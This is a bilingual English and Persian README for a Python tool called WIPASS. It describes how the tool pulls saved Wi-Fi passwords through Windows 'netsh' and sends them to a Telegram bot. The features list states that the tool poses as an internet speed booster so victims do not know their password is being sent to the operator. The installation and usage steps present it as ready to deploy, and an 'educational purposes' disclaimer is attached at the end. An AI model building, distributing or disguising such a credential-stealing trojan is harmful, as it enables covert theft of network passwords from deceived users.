# WIPASS tool
- [Persian](#توضیحات)
## Description
This Python script retrieves the saved Wi-Fi password of a specified network and sends it to a Telegram bot using the Telegram API.

## Features
- The tool is an internet speed booster, and the user does not know that their password is being sent to you.
- Extracts the Wi-Fi password using the Windows `netsh` command
- Formats the password using MarkdownV2 for proper display in Telegram
- Sends the extracted password to a specified Telegram bot

## Prerequisites
- Windows OS (as the script uses `netsh` command)
- Python 3.x installed
- Telegram bot token and chat ID

## Installation
1. Clone this repository:
   ```sh
   git clone https://github.com/Amirprx3/WIPASS.git
   cd WIPASS
   ```
2. Install required dependencies:
   ```sh
   pip install requests
   ```

## Usage
1. Run the script:
   ```sh
   python WIPASS.py
   ```
2. Enter the Wi-Fi name when prompted.
3. The password will be extracted and sent to the Telegram bot.

## Code Overview
- Uses `subprocess.getoutput` to execute `netsh wlan show profiles` command
- Parses the command output to extract the Wi-Fi password
- Escapes special characters for MarkdownV2 formatting
- Sends the formatted password to a Telegram bot using `requests.get`

## Disclaimer
This script is intended for educational and security research purposes only. Unauthorized use of this script is strictly prohibited. Use at your own risk.

## Author
**Amirprx3**

[GitHub Profile](https://github.com/Amirprx3)


<!-- persian -->
# ابزار WIPASS

## توضیحات
این اسکریپت پایتون رمز عبور وای‌فای ذخیره‌شده را از شبکه مشخص‌شده بازیابی کرده و آن را از طریق API تلگرام به یک ربات ارسال می‌کند.

## ویژگی‌ها
- ابزار به صورت یک تقویت کننده سرعت اینترنت است و کاربر از همین طریق نمی داند که رمز عبور او برای شما ارسال میشود.
- استخراج رمز وای‌فای با استفاده از دستور `netsh` در ویندوز
- قالب‌بندی رمز عبور با استفاده از MarkdownV2 برای نمایش صحیح در تلگرام
- ارسال رمز عبور استخراج‌شده به یک ربات تلگرام مشخص‌شده

## پیش‌نیازها
- سیستم‌عامل ویندوز (زیرا اسکریپت از دستور `netsh` استفاده می‌کند)
- نصب پایتون 3.x
- توکن ربات تلگرام و شناسه چت

## نصب
1. کلون کردن این مخزن:
   ```sh
   git clone https://github.com/Amirprx3/WIPASS.git
   cd WIPASS
   ```
2. نصب وابستگی‌های مورد نیاز:
   ```sh
   pip install requests
   ```

## استفاده
1. اجرای اسکریپت:
   ```sh
   python WIPASS.py
   ```
2. نام وای‌فای را در هنگام درخواست وارد کنید.
3. رمز عبور استخراج شده و به ربات تلگرام ارسال خواهد شد.

## بررسی کد
- استفاده از `subprocess.getoutput` برای اجرای دستور `netsh wlan show profiles`
- تجزیه خروجی دستور برای استخراج رمز عبور وای‌فای
- فرار دادن کاراکترهای خاص برای قالب‌بندی MarkdownV2
- ارسال رمز قالب‌بندی‌شده به ربات تلگرام با استفاده از `requests.get`

## سلب مسئولیت
این اسکریپت فقط برای اهداف آموزشی و تحقیقاتی در حوزه امنیت ارائه شده است. استفاده غیرمجاز از این اسکریپت اکیداً ممنوع است. استفاده از آن به عهده خودتان است.

## نویسنده
**Amirprx3**

[پروفایل گیت‌هاب](https://github.com/Amirprx3)